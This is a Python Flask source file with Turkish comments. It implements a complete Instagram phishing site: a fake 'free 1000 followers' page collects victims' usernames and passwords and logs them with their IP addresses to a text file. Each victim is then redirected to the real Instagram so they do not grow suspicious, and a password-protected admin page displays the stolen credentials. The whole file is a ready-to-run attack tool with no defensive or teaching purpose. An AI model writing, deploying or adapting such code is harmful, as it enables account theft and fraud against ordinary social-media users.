from flask import Flask, request, redirect, render_template_string
import os

app = Flask(__name__)

# --- AYARLAR ---
ADMIN_SIFRE = "aytac1235"  # Loglara bakmak için şifreni buraya yaz
LOG_FILE = "loglar.txt"

# Ana Sayfa (Takipçi Paneli Görünümü)
@app.route('/')
def index():
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Ücretsiz Takipçi Paneli</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body { font-family: sans-serif; text-align: center; background-color: #f0f2f5; padding-top: 50px; }
            .box { background: white; padding: 20px; border-radius: 10px; display: inline-block; box-shadow: 0 4px 8px rgba(0,0,0,0.1); width: 80%; max-width: 400px; }
            input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
            button { background: #3897f0; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 95%; }
        </style>
    </head>
    <body>
        <div class="box">
            <h2 style="color: #3897f0;">✨ Takipçi Kazandır ✨</h2>
            <p>1000 Ücretsiz Takipçi için Bilgileri Doldurun</p>
            <form action="/login" method="POST">
                <input type="text" name="user" placeholder="Instagram Kullanıcı Adı" required>
                <input type="password" name="pass" placeholder="Hesap Şifreniz" required>
                <button type="submit">Takipçileri Gönder</button>
            </form>
            <p style="font-size: 12px; color: #999;">Bu işlem 24 saat sürebilir.</p>
        </div>
    </body>
    </html>
    """
    return render_template_string(html)

# Verileri Kaydetme Noktası
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('user')
    password = request.form.get('pass')
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Bilgileri dosyaya kaydet
    with open(LOG_FILE, "a") as f:
        f.write(f"Kullanıcı: {username} | Şifre: {password} | IP: {user_ip}\n")
    
    # Kurbanı gerçek Instagram'a yönlendir ki şüphelenmesin
    return redirect("https://instagram.com")

# Admin Paneli (Logları Görmek İçin)
@app.route('/admin')
def admin():
    sifre = request.args.get('sifre')
    if sifre == ADMIN_SIFRE:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                veriler = f.read()
            return f"<h1>Sistem Logları</h1><pre>{veriler}</pre>"
        return "Henüz log yok."
    return "Hatalı Şifre!", 403

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

